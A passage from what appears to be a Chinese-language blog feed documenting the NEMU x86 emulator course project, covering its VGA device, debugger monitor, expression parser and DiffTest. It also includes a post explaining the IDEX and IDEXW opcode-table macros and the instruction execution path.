style="text-align:left">键队列长度</td></tr></tbody></table><h3 id="vgac"><a class="markdownIt-Anchor" href="#vgac"></a> vga.c</h3><p>VGA 设备。 模拟了VGA的功能. VGA初始化时注册了从 <code>0x40000</code> 开始的一段用于映射到video memory的物理内存. 在NEMU中, video memory是唯一使用内存映射I/O方式访问的I/O空间. 代码只模拟了400x300x32的图形模式, 一个像素占32个bit的存储空间, R(red), G(green), B(blue), A(alpha)各占8 bit, 其中VGA不使用alpha的信息。VGA 设备同时注册了位于 <code>0x100</code> 的长度为 4 的端口存储屏幕大小信息。</p><table><thead><tr><th style="text-align:left">函数/宏</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>init_vga()</code></td><td style="text-align:left">初始化设备</td></tr><tr><td style="text-align:left"><code>SCREEN_PORT=0x100</code></td><td style="text-align:left">端口 I/O 地址</td></tr><tr><td style="text-align:left"><code>VMEM=0x40000</code></td><td style="text-align:left">内存映射 I/O 地址</td></tr><tr><td style="text-align:left"><code>SCREEN_H</code></td><td style="text-align:left">屏幕高度</td></tr><tr><td style="text-align:left"><code>SCREEN_W</code></td><td style="text-align:left">屏幕宽度</td></tr></tbody></table><h2 id="monitor"><a class="markdownIt-Anchor" href="#monitor"></a> monitor/</h2><p>监视器部分实现（也包含 NEMU 执行主循环）。</p><h3 id="monitorc"><a class="markdownIt-Anchor" href="#monitorc"></a> monitor.c</h3><h4 id="函数-init_monitor"><a class="markdownIt-Anchor" href="#函数-init_monitor"></a> 函数 init_monitor</h4><p>初始化监视器并启动（用于 <code>main.c/main</code> 中）。</p><ul><li>解析并处理命令行参数</li><li>初始化日志文件</li><li>寄存器测试（调用 <code>reg_test()</code>，实现在 <code>src/cpu/reg.c</code>）</li><li>加载程序镜像（根据命令行参数，如果为空，则调用 <code>load_default_img()</code> 加载默认镜像）</li><li>启动环境（调用 <code>restart()</code>，初始化应用程序入口点，寄存器值）</li><li>编译正则表达式（调用 <code>init_regex()</code>，实现在 <code>src/monitor/debug/expr.c</code>）</li><li>初始化监视点池（调用 <code>init_wp_pool()</code>，实现在 <code>src/monitor/debug/watchpoint.c</code>）</li><li>初始化设备（调用 <code>init_device()</code>，实现在 <code>src/device/device.c</code>）</li><li>初始化差异测试（调用 <code>init_difftest()</code>，实现在 <code>src/monitor/diff-test.c</code>）</li><li>显示欢迎界面</li><li>返回是否为批处理模式（根据命令行参数）</li></ul><p>注：</p><ul><li>命令行参数<ul><li><code>[img_file]</code> 指定应用程序镜像文件</li><li><code>-b</code> 批处理模式</li><li><code>-l log_file</code> 指定日志文件</li><li><code>-d</code> 指定 Diff-Test 镜像文件</li></ul></li></ul><h3 id="cpu-execc"><a class="markdownIt-Anchor" href="#cpu-execc"></a> cpu-exec.c</h3><h4 id="函数-cpu_exec"><a class="markdownIt-Anchor" href="#函数-cpu_exec"></a> 函数 cpu_exec</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cpu_exec</span><span class="params">(<span class="keyword">uint64_t</span> n)</span></span>;</span><br></pre></td></tr></table></figure><p>模拟 CPU 工作。</p><ul><li>判断 NEMU 状态（查看 <code>nemu_state</code>，定义在 <code>include/monitor/monitor.h</code>）</li><li>若指令数 <code>n</code> 小于 <code>MAX_INSTR_TO_PRINT</code> （默认为 10），则打印每条指令。</li><li>开始执行指令<ul><li>调用 <code>exec_wrapper</code> 执行下一条指令（传入是否打印指令标记）</li><li>检查监视点状态是否有更新</li><li>更新设备信息</li><li>判断 NEMU 状态（查看 <code>nemu_state</code>），决定是否退出</li></ul></li><li>执行完 <code>n</code> 条指令后，将 NEMU 状态置为结束（<code>NEMU_END</code>）</li></ul><p>注：</p><ul><li>执行某条命令后<ul><li>若 NEMU 状态为结束（<code>NEMU_END</code>），则检查程序返回值（<code>cpu.eax</code>）是否为 0（是否正常退出）。并输出 <code>HIT GOOD TRAP</code>（正常退出） 或 <code>HIT BAD TRAP</code>（非正常退出）。</li></ul></li></ul><h3 id="debug"><a class="markdownIt-Anchor" href="#debug"></a> debug/</h3><h4 id="watchpointc"><a class="markdownIt-Anchor" href="#watchpointc"></a> watchpoint.c</h4><p>定义了监视点内存池及其相关的函数。</p><ul><li><code>wp_pool</code> 监视点池</li><li><code>head</code> 使用中的监视点链表头指针</li><li><code>free_</code> 监视点池中未使用的监视点链表头指针</li></ul><table><thead><tr><th style="text-align:left">函数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>init_wp_pool()</code></td><td style="text-align:left">初始化监视点内存池</td></tr><tr><td style="text-align:left"><code>clearWP(wp)</code></td><td style="text-align:left">清空某监视点的下一项指针</td></tr><tr><td style="text-align:left"><code>WP *getHeadWP()</code></td><td style="text-align:left">获取 <code>head</code></td></tr><tr><td style="text-align:left"><code>WP *createWP()</code></td><td style="text-align:left">申请使用一个新监视点（内部调用 <code>new_wp()</code> 并更新链表信息）</td></tr><tr><td style="text-align:left"><code>removeWP(no)</code></td><td style="text-align:left">删除指定编号的监视点</td></tr><tr><td style="text-align:left"><code>WP *new_wp()</code></td><td style="text-align:left">（私有）从内存池中获取下一个能使用的监视点，并作一定预处理</td></tr><tr><td style="text-align:left"><code>free_wp(wp)</code></td><td style="text-align:left">（私有）释放一个监视点</td></tr></tbody></table><h4 id="exprc"><a class="markdownIt-Anchor" href="#exprc"></a> expr.c</h4><p>实现了 <code>expr.h/expr</code> 函数，实现表达式解析和求值。</p><h5 id="常量"><a class="markdownIt-Anchor" href="#常量"></a> 常量</h5><ul><li><code>PRI_NEG</code> 取负运算优先级</li><li><code>PRI_POINT</code> 解引用运算优先级</li><li>形如 <code>TK_TYPE</code> 的 Token 类型枚举</li></ul><h5 id="数组-rules"><a class="markdownIt-Anchor" href="#数组-rules"></a> 数组 rules</h5><p>规定了使用正则表达式解析 Token 的规则。</p><table><thead><tr><th style="text-align:left">成员</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>regex</code></td><td style="text-align:left">正则表达式字符串</td></tr><tr><td style="text-align:left"><code>token_type</code></td><td style="text-align:left">对应 Token 类型，可用 <code>TK_TYPE</code> 枚举或字符（如 <code>+</code>）表示</td></tr><tr><td style="text-align:left"><code>opPri</code></td><td style="text-align:left">运算符 Token 的优先级</td></tr></tbody></table><h5 id="数组-re"><a class="markdownIt-Anchor" href="#数组-re"></a> 数组 re</h5><p>根据 <code>rules</code> 编译后的正则表达式。</p><h5 id="函数-init_regex"><a class="markdownIt-Anchor" href="#函数-init_regex"></a> 函数 <code>init_regex</code></h5><p>根据 <code>rules</code> 编译到 <code>re</code></p><h5 id="结构体-token"><a class="markdownIt-Anchor" href="#结构体-token"></a> 结构体 Token</h5><p>识别后的 Token.</p><table><thead><tr><th style="text-align:left">成员</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>type</code></td><td style="text-align:left">Token 类型，可用 <code>TK_TYPE</code> 枚举或字符（如 <code>+</code>）表示</td></tr><tr><td style="text-align:left"><code>isOp</code></td><td style="text-align:left">标记此 Token 是否是运算符</td></tr><tr><td style="text-align:left"><code>isValue</code></td><td style="text-align:left">标记此 Token 是否是值</td></tr><tr><td style="text-align:left"><code>str</code></td><td style="text-align:left">Token 的原始字符串</td></tr><tr><td style="text-align:left"><code>data</code></td><td style="text-align:left">值类型的实际数据</td></tr><tr><td style="text-align:left"><code>priority</code></td><td style="text-align:left">运算符的优先级</td></tr></tbody></table><ul><li><code>isOp</code> 和 <code>isValue</code> 多用于区分特殊单目运算符，如解引用和取负</li><li><code>data</code> 多存储经过预处理的数据，如转换后的整数</li></ul><blockquote><p>解析后的 Token 列表存储在数组 <code>tokens</code> 中。 <code>nr_token</code> 指示 <code>token</code> 有效长度。</p></blockquote><h5 id="函数-make_token"><a class="markdownIt-Anchor" href="#函数-make_token"></a> 函数 make_token</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">make_token</span><span class="params">(<span class="keyword">char</span> *e)</span></span></span><br></pre></td></tr></table></figure><p>根据字符串解析 Token 列表，返回是否解析成功。</p><p>实现思路：使用 <code>re</code> 依次尝试每一种匹配，直到遇到第一个成功匹配，根据其规则的 <code>token_type</code> 生成 Token，存入 <code>token</code>。</p><ul><li>函数 <code>toInteger</code> ：以指定进制完成字符串到数的转换，用于 十进制，二进制，八进制，十六进制 数的解析。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint32_t</span> <span class="title">toInteger</span><span class="params">(<span class="keyword">char</span> *s, <span class="keyword">uint32_t</span> base)</span></span></span><br></pre></td></tr></table></figure><h5 id="函数-evalwithtoken"><a class="markdownIt-Anchor" href="#函数-evalwithtoken"></a> 函数 evalWithToken</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">evalWithToken</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">bool</span> * success)</span></span></span><br></pre></td></tr></table></figure><p>求解 <code>tokens[l..r]</code> 中的表达式的值。</p><p>实现思路：单 Token 特殊处理，然后处理外围括号情况，然后确定最后计算的运算符，分割成 <code>left</code> 和 <code>right</code> 两部分，然后递归解决，最后合并，</p><ul><li>函数 <code>checkExtraP</code> 判断 <code>tokens[l..r]</code> 是否外围为括号且括号匹配正常。</li><li>函数 <code>getReg</code> 根据寄存器名获取寄存器值，使用了 <code>regMap</code></li><li>数组 <code>regMap</code> 标识寄存器名与对应的偏移量（<code>cpu.gpr</code>）</li></ul><h5 id="函数-expr"><a class="markdownIt-Anchor" href="#函数-expr"></a> 函数 expr</h5><p>对 <code>expr.h/expr</code> 的实现，调用了 <code>make_token</code> 和 <code>evalWithToken</code>。</p><h4 id="uic"><a class="markdownIt-Anchor" href="#uic"></a> ui.c</h4><p>监视器 CUI 部分。</p><h5 id="函数族-fc2color"><a class="markdownIt-Anchor" href="#函数族-fc2color"></a> 函数族 fc2color</h5><p>控制台字体颜色控制。</p><table><thead><tr><th style="text-align:left">函数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>fc2red</code></td><td style="text-align:left">前景色设为红色</td></tr><tr><td style="text-align:left"><code>fc2green</code></td><td style="text-align:left">前景色设为绿色</td></tr><tr><td style="text-align:left"><code>fc2yellow</code></td><td style="text-align:left">前景色设为黄色</td></tr><tr><td style="text-align:left"><code>fc2blue</code></td><td style="text-align:left">前景色设为蓝色</td></tr><tr><td style="text-align:left"><code>fc2purple</code></td><td style="text-align:left">前景色设为紫色</td></tr><tr><td style="text-align:left"><code>csClear</code></td><td style="text-align:left">清除所有控制台设置</td></tr></tbody></table><h5 id="函数族-cmd_item"><a class="markdownIt-Anchor" href="#函数族-cmd_item"></a> 函数族 cmd_item</h5><p>不同命令的实现。</p><table><thead><tr><th style="text-align:left">函数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>cmd_help</code></td><td style="text-align:left">获取帮助</td></tr><tr><td style="text-align:left"><code>cmd_q</code></td><td style="text-align:left">退出</td></tr><tr><td style="text-align:left"><code>cmd_c</code></td><td style="text-align:left">继续执行（调用 <code>cpu_exec(-1)</code>，实现在 <code>src/monitor/cpu-exec.c</code>）</td></tr><tr><td style="text-align:left"><code>cmd_si</code></td><td style="text-align:left">执行单步指令</td></tr><tr><td style="text-align:left"><code>cmd_info name</code></td><td style="text-align:left">查看信息</td></tr><tr><td style="text-align:left"><code>cmd_x N expr</code></td><td style="text-align:left">显示地址从 <code>expr</code> 的值开始的 <code>N</code> 个字节值</td></tr><tr><td style="text-align:left"><code>cmd_p expr</code></td><td style="text-align:left">计算表达式的值</td></tr><tr><td style="text-align:left"><code>cmd_w expr</code></td><td style="text-align:left">新建监视点，监视表达式为 <code>expr</code></td></tr><tr><td style="text-align:left"><code>cmd_d no</code></td><td style="text-align:left">删除指定编号的监视点</td></tr></tbody></table><ul><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd_info</span><br></pre></td></tr></table></figure><ul><li><code>r</code> 打印所有寄存器信息</li><li><code>w</code> 打印所有监视点信息</li></ul></li></ul><h5 id="数组-cmd_table"><a class="markdownIt-Anchor" href="#数组-cmd_table"></a> 数组 cmd_table</h5><table><thead><tr><th style="text-align:left">成员</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>name</code></td><td style="text-align:left">命令名（用于识别命令）</td></tr><tr><td style="text-align:left"><code>description</code></td><td style="text-align:left">命令描述（用于帮助列表）</td></tr><tr><td style="text-align:left"><code>handler</code></td><td style="text-align:left">命令实现函数指针</td></tr></tbody></table><h5 id="函数-ui_mainloop"><a class="markdownIt-Anchor" href="#函数-ui_mainloop"></a> 函数 ui_mainloop</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ui_mainloop</span><span class="params">(<span class="keyword">int</span> is_batch_mode)</span></span>;</span><br></pre></td></tr></table></figure><p>NEMU 以及其 CUI 主循环，不断读取命令，并执行。</p><ul><li>如果是批处理模式（<code>is_batch_mode</code> 为真），则直接执行应用程序，不监听用户命令。</li></ul><h3 id="diff-test"><a class="markdownIt-Anchor" href="#diff-test"></a> diff-test/</h3><p>差异测试实现。</p><blockquote><p>如果有一种方法能够表达指令的正确行为, 我们就可以基于这种方法来进行类似assert()的检查了。那么, 究竟什么地方表达了指令的正确行为呢? 最直接的, 当然就是i386手册了, 但是我们恰恰就是根据i386手册中的指令行为来在NEMU中实现指令的, 同一套方法不能既用于实现也用于检查. 如果有一个i386手册的参考实现就好了. 嘿! 我们用的真机不就是根据i386手册实现出来的吗? 我们让在NEMU中执行的每条指令也在真机中执行一次, 然后对比NEMU和真机的状态, 如果NEMU和真机的状态不一致, 我们就捕捉到error了! 这实际上是一种非常奏效的测试方法, 在软件测试领域称为differential testing(后续简称DiffTest). 我们刚才提到了&quot;状态&quot;, 那&quot;状态&quot;具体指的是什么呢? 我们在PA1中已经认识到, 计算机就是一个数字电路. 那么, “计算机的状态&quot;就恰恰是那些时序逻辑部件的状态, 也就是寄存器和内存的值. 其实仔细思考一下, 计算机执行指令, 就是修改这些时序逻辑部件的状态的过程. 要检查指令的实现是否正确, 只要检查这些时序逻辑部件中的值是否一致就可以了! DiffTest可以非常及时地捕捉到error, 第一次发现NEMU的寄存器或内存的值与真机不一样的时候, 就是因为当时执行的指令实现有误导致的. 这时候其实离error非常接近, 防止了error进一步传播的同时, 要回溯找到fault也容易得多. 多么美妙的功能啊! 背后还蕴含着计算机本质的深刻原理! 但很遗憾, 不要忘记了, 真机上是运行了操作系统GNU/Linux的, 而NEMU中的测试程序是运行在x86-nemu上的, 我们无法在native中运行编译到x86-nemu的AM程序. 所以, 我们需要的不仅是一个i386手册的正确实现, 而且需要在上面能正确运行x86-nemu的AM程序. 事实上, QEMU就是一个不错的参考实现. 它是一个虚拟出来的完整的x86计算机系统, 而NEMU的目标只是虚拟出x86的一个子集, 能在NEMU上运行的程序, 自然也能在QEMU上运行. 因此, 为了通过DiffTest的方法测试NEMU实现的正确性, 我们让NEMU和QEMU逐条指令地执行同一个客户程序. 双方每执行完一条指令, 就检查各自的寄存器和内存的状态, 如果发现状态不一致, 就马上报告错误, 停止客户程序的执行.</p></blockquote><h4 id="diff-testh"><a class="markdownIt-Anchor" href="#diff-testh"></a> diff-test.h</h4><p>定义了宏 <code>DIFFTEST_REG_SIZE</code> 规定访问的寄存器大小。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DIFFTEST_REG_SIZE (sizeof(uint32_t) * 9) <span class="comment">// GRPs + EIP</span></span></span><br></pre></td></tr></table></figure><h4 id="refc"><a class="markdownIt-Anchor" href="#refc"></a> ref.c</h4><p>在 DUT(Design Under Test, 测试对象)和 REF(Reference, 参考实现) 之间定义了一组 API。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从DUT host memory的 src 处拷贝 n 字节到REF guest memory的 dest 处</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">difftest_memcpy_from_dut</span><span class="params">(<span class="keyword">paddr_t</span> dest, <span class="keyword">void</span> *src, <span class="keyword">size_t</span> n)</span></span>;</span><br><span class="line"><span class="comment">// 获取REF的寄存器状态到 r </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">difftest_getregs</span><span class="params">(<span class="keyword">void</span> *r)</span></span>;</span><br><span class="line"><span class="comment">// 设置REF的寄存器状态为 r </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">difftest_setregs</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *r)</span></span>;</span><br><span class="line"><span class="comment">// 让REF执行 n 条指令</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">difftest_exec</span><span class="params">(<span class="keyword">uint64_t</span> n)</span></span>;</span><br><span class="line"><span class="comment">// 初始化REF的DiffTest功能</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">difftest_init</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><ul><li>其中寄存器状态 <code>r</code> 要求寄存器的值按照某种顺序排列，若未按要求顺序排列， <code>difftest_getregs()</code> 和 <code>difftest_setregs()</code> 的行为是未定义的. REF 需要实现这些 API，DUT会使用这些 API 来进行 DiffTest 。</li></ul><h4 id="diff-testc"><a class="markdownIt-Anchor" href="#diff-testc"></a> diff-test.c</h4><p>定义了变量 <code>is_skip_ref</code>，<code>is_skip_dut</code> 用于标记忽视一些指令处的比对。（可结合 <code>difftest_step</code> 实现） 定义了函数 <code>difftest_skip_ref</code>，<code>difftest_skip_dut</code> 标记上述变量。</p><h5 id="函数-init_difftest"><a class="markdownIt-Anchor" href="#函数-init_difftest"></a> 函数 init_difftest</h5><p>初始化 Diff-Test。</p><ul><li>打开动态库文件 <code>ref_so_file</code></li><li>从动态库中分别读取上述 API 的符号</li><li>对 REF 的 DIffTest功能进行初始化，此时会启动 REF，代码还会对 REF 的状态进行一些初始化工作，REF 运行在后台，因此将看不到 REF 的任何输出</li><li>将 DUT 的 guest memory 拷贝到 REF 中</li><li>将 DUT 的寄存器状态拷贝到 REF 中</li></ul><h5 id="函数-difftest_step"><a class="markdownIt-Anchor" href="#函数-difftest_step"></a> 函数 difftest_step</h5><p>用于逐条指令执行后的状态对比。它会在 <code>exec_wrapper()</code> 的最后被调用。在这里读取 REF 的寄存器并与 NEMU 寄存器状态比对。</p><h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> misc/</h2><h3 id="logoc"><a class="markdownIt-Anchor" href="#logoc"></a> logo.c</h3><p>定义了字符数组 <code>logo</code> 存储 i386 Manual Logo。用于 <code>inv</code> 指令（位于 <code>special.c</code> 中）。</p><h1 id="4-tools"><a class="markdownIt-Anchor" href="#4-tools"></a> 4 tools/</h1><h2 id="gen-exprc"><a class="markdownIt-Anchor" href="#gen-exprc"></a> gen-expr.c</h2><p>生成 C 表达式，用于测试表达式求值功能。</p><h2 id="qemu-diff"><a class="markdownIt-Anchor" href="#qemu-diff"></a> qemu-diff</h2><p>QEMU 实现，用于 Diff-Test。编译成动态库 <code>qemu-so</code>，传入 nemu 的 <code>-d</code> 参数中。</p>]]></content>
      
      
      <categories>
          
          <category> 计组 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PA答疑之IDEX和IDEXW</title>
      <link href="/2022/04/23/PA%E7%AD%94%E7%96%91%E4%B9%8BIDEX%E5%92%8CIDEXW/"/>
      <url>/2022/04/23/PA%E7%AD%94%E7%96%91%E4%B9%8BIDEX%E5%92%8CIDEXW/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-问题"><a class="markdownIt-Anchor" href="#1-问题"></a> 1 问题</h1><p><code>IDEX</code>其实就是相当于<code>IDEXW(,,0)</code>？可是最后一个参数不是操作数宽度吗？为什么会有0呢？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IDEXW(id, ex, w)   &#123;concat(decode_, id), concat(exec_, ex), w&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IDEX(id, ex)       IDEXW(id, ex, 0)</span></span><br></pre></td></tr></table></figure><p>学妹的问题我不会🥦，于是请舍友帮忙解答，记录下。</p><h1 id="2-指令的执行周期"><a class="markdownIt-Anchor" href="#2-指令的执行周期"></a> 2 指令的执行周期</h1><h2 id="21-取指instruction-fetch-if"><a class="markdownIt-Anchor" href="#21-取指instruction-fetch-if"></a> 2.1 取指(instruction fetch, IF)</h2><p>取指令要做的事情自然就是将 <code>eip</code> 指向的指令从内存读入到CPU中。</p><h2 id="22-译码instruction-decode-id"><a class="markdownIt-Anchor" href="#22-译码instruction-decode-id"></a> 2.2 译码(instruction decode, ID)</h2><p>CPU拿到一条指令之后，可以通过查表的方式得知这条指令的操作数和操作码。这个过程叫译码。</p><p>计算机现在已经有存储器和寄存器了，它们都可以存放操作数，指令中也可以存放立即数，也可能还有二次译码的处理。</p><h2 id="23-执行execute-ex"><a class="markdownIt-Anchor" href="#23-执行execute-ex"></a> 2.3 执行(execute, EX)</h2><p>执行阶段就是真正完成指令的工作。现在 TRM 只有加法器这一个执行部件，必要的时候,，只需要往加法器输入两个源操作数, 就能得到执行的结果了。之后还要把结果写回到目的操作数中, 可能是寄存器, 也可能是内存。</p><h2 id="24-更新-eip"><a class="markdownIt-Anchor" href="#24-更新-eip"></a> 2.4 更新 <code>eip</code></h2><p>执行完一条指令之后，CPU就要执行下一条指令。在这之前，CPU 需要更新 <code>eip</code> 的值，让 <code>eip</code> 加上刚才执行完的指令的长度, 即可指向下一条指令的位置。</p><h1 id="3-一条指令在nemu中的执行过程"><a class="markdownIt-Anchor" href="#3-一条指令在nemu中的执行过程"></a> 3 一条指令在NEMU中的执行过程</h1><h2 id="31-idex与idexw"><a class="markdownIt-Anchor" href="#31-idex与idexw"></a> 3.1 IDEX与IDEXW</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  DHelper decode;</span><br><span class="line">  EHelper execute;</span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">width</span>;</span><br><span class="line">&#125; opcode_entry;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IDEXW(id, ex, w)   &#123;concat(decode_, id), concat(exec_, ex), w&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IDEX(id, ex)       IDEXW(id, ex, 0)</span></span><br><span class="line"></span><br><span class="line">opcode_entry opcode_table [<span class="number">512</span>] = &#123;</span><br><span class="line">  <span class="comment">/* 0x00 */</span>IDEXW(G2E, add, <span class="number">1</span>), IDEX(G2E, add), IDEXW(E2G, add, <span class="number">1</span>), IDEX(E2G, add),</span><br><span class="line">  <span class="comment">/* 0x04 */</span>IDEXW(I2a, add, <span class="number">1</span>), IDEX(I2a, add), EMPTY, EMPTY,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>IDEXW</code>中的<code>w</code>也就是结构体<code>opcode_entry</code>中的<code>width</code>。</p><h2 id="32-过程"><a class="markdownIt-Anchor" href="#32-过程"></a> 3.2 过程</h2><h3 id="321-mainc"><a class="markdownIt-Anchor" href="#321-mainc"></a> 3.2.1 main.c</h3><p>nemu运行起来，主函数 <code>nemu/src/main.c</code>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* Initialize the monitor. */</span></span><br><span class="line">  <span class="keyword">int</span> is_batch_mode = init_monitor(argc, argv);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Receive commands from user. */</span></span><br><span class="line">  ui_mainloop(is_batch_mode);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="322-ui_mainloop"><a class="markdownIt-Anchor" href="#322-ui_mainloop"></a> 3.2.2 ui_mainloop()</h3><p>执行<code>ui_mainloop</code>函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ui_mainloop</span><span class="params">(<span class="keyword">int</span> is_batch_mode)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (is_batch_mode) &#123; <span class="comment">//批处理</span></span><br><span class="line">    cmd_c(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">// 处理传来的字符串</span></span><br><span class="line">  ...</span><br><span class="line">    <span class="comment">// 执行指令</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NR_CMD; i ++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strcmp</span>(cmd, cmd_table[i].name) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cmd_table[i].handler(args) &lt; <span class="number">0</span>) &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (i == NR_CMD) &#123; <span class="built_in">printf</span>(<span class="string">"Unknown command '%s'\n"</span>, cmd); &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="323-cmd_c"><a class="markdownIt-Anchor" href="#323-cmd_c"></a> 3.2.3 cmd_c()</h3><p>例如在nemu下执行<code>c</code>命令（继续运行被暂停的程序至结束）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">cmd_c</span><span class="params">(<span class="keyword">char</span> *args)</span> </span>&#123;</span><br><span class="line">  cpu_exec(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="324-cpu_exec"><a class="markdownIt-Anchor" href="#324-cpu_exec"></a> 3.2.4 cpu_exec()</h3><p>然后调用cpu_exec函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Simulate how the CPU works. */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cpu_exec</span><span class="params">(<span class="keyword">uint64_t</span> n)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">for</span> (; n &gt; <span class="number">0</span>; n --) &#123;</span><br><span class="line">    <span class="comment">/* Execute one instruction, including instruction fetch,</span></span><br><span class="line"><span class="comment">     * instruction decode, and the actual execution. */</span></span><br><span class="line">    exec_wrapper(print_flag);</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span 